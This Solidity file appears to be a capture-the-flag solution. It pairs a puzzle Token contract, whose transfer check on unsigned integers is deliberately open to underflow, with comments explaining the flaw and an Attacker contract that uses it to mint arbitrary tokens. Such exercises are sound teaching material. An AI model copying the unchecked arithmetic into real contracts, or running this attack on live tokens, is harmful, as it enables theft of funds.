// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/*The goal of this level is for you to hack the basic token contract below.
You are given 20 tokens to start with and you will beat the level if you somehow manage 
to get your hands on any additional tokens. Preferably a very large amount of tokens.*/
//0xfCa8d207a452020aab1E5D15C28B11AD62ce828d

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

//solution
//  require will pass you even with bigger amount than you have
//  it can't make result below zero from two uint due to underflow

contract Attacker {

    address public _target;
    address public _owner;

    constructor(address target) public {
        _target = target;
        _owner = msg.sender;
    }

    function Attack(uint amount) public {
        Token(_target).transfer(_owner, amount);
    }
}
